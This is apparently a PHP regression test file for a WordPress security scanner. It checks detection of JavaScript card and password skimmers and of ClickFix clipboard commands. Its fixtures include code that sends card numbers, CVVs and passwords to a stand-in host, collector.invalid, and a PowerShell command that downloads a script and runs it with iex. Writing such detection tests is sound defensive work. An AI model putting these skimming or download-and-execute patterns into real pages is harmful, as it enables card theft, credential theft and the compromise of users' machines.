<?php
/**
 * Regression tests for direct, unobfuscated JavaScript credential/card skimmers.
 */

define( 'WP_CLI', true );

class WP_CLI {
	public static function add_command( $name, $class ) {}
}

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';
require dirname( __DIR__ ) . '/src/SecurityScanCommand.php';

$command = new Security_Scan_Command();
$reflection = new ReflectionClass( $command );
$scan = $reflection->getMethod( 'scan_javascript_sensitive_external_transfer' );
$scan->setAccessible( true );
$host = $reflection->getProperty( 'site_home_host' );
$host->setAccessible( true );
$host->setValue( $command, 'example.test' );
$findings = $reflection->getProperty( 'findings' );
$findings->setAccessible( true );

$tests = [
	[
		'name' => 'card fields sent to external fetch endpoint',
		'code' => <<<'JS'
const card = document.getElementById('card_number').value;
const cvv = document.querySelector('[name="cvv"]').value;
fetch('https://collector.invalid/checkout', { method: 'POST', body: JSON.stringify({ card, cvv }) });
JS,
		'expect' => true,
	],
	[
		'name' => 'password sent through external beacon',
		'code' => <<<'JS'
const password = document.querySelector('input[name="password"]').value;
navigator.sendBeacon('https://collector.invalid/login', password);
JS,
		'expect' => true,
	],
	[
		'name' => 'sensitive local AJAX request is not external exfiltration',
		'code' => <<<'JS'
const password = document.getElementById('password').value;
fetch('https://www.example.test/wp-admin/admin-ajax.php', { method: 'POST', body: password });
JS,
		'expect' => false,
	],
	[
		'name' => 'ordinary analytics data to external endpoint is not sensitive',
		'code' => <<<'JS'
const message = document.getElementById('message').value;
fetch('https://analytics.invalid/event', { method: 'POST', body: message });
JS,
		'expect' => false,
	],
	[
		'name' => 'card field handling without outbound network is not reported',
		'code' => <<<'JS'
const card = document.getElementById('card_number').value;
window.checkoutState = card;
JS,
		'expect' => false,
	],
];

$failed = 0;
foreach ( $tests as $test ) {
	$findings->setValue( $command, [] );
	$seen = [];
	$args = [ 'Plugins', 'plugins/example/skimmer.js', $test['code'], &$seen, 1 ];
	$scan->invokeArgs( $command, $args );
	$rules = array_column( $findings->getValue( $command ), 'rule' );
	$has = in_array( 'js_sensitive_external_transfer', $rules, true );
	$ok = $has === $test['expect'];
	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $test['name'] . PHP_EOL;
	if ( ! $ok ) {
		echo '      rules: ' . implode( ', ', $rules ) . PHP_EOL;
		$failed++;
	}
}

if ( $failed > 0 ) {
	exit( 1 );
}

echo PHP_EOL . 'JavaScript sensitive-transfer smoke tests passed.' . PHP_EOL;


$javascript_rules = json_decode( file_get_contents( dirname( __DIR__ ) . '/rules/javascript.json' ), true );
$clickfix_rule = null;
foreach ( $javascript_rules['rules'] as $rule ) {
	if ( 'js_clickfix_clipboard_command' === $rule['id'] ) {
		$clickfix_rule = $rule;
		break;
	}
}

if ( null === $clickfix_rule ) {
	echo "FAIL  ClickFix rule is missing\n";
	exit( 1 );
}

$clickfix_tests = [
	[
		'name' => 'ClickFix PowerShell download command copied to clipboard',
		'code' => <<<'JS'
const command = 'powershell.exe -NoProfile -EncodedCommand AAAA';
navigator.clipboard.writeText(command);
JS,
		'expect' => true,
	],
	[
		'name' => 'ClickFix remote execution command copied through clipboard API',
		'code' => <<<'JS'
const command = 'powershell -nop -c iwr https://collector.invalid/x.txt | iex';
navigator.clipboard.writeText(command);
JS,
		'expect' => true,
	],
	[
		'name' => 'ordinary text copied to clipboard is not ClickFix',
		'code' => <<<'JS'
navigator.clipboard.writeText('support@example.test');
JS,
		'expect' => false,
	],
	[
		'name' => 'PowerShell documentation without clipboard action is not ClickFix',
		'code' => <<<'JS'
const example = 'powershell -EncodedCommand AAAA';
console.log(example);
JS,
		'expect' => false,
	],
];

foreach ( $clickfix_tests as $test ) {
	$matched = 1 === preg_match( $clickfix_rule['regex'], $test['code'] );
	$ok = $matched === $test['expect'];
	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $test['name'] . PHP_EOL;
	if ( ! $ok ) {
		$failed++;
	}
}

if ( $failed > 0 ) {
	exit( 1 );
}

echo PHP_EOL . 'JavaScript ClickFix smoke tests passed.' . PHP_EOL;
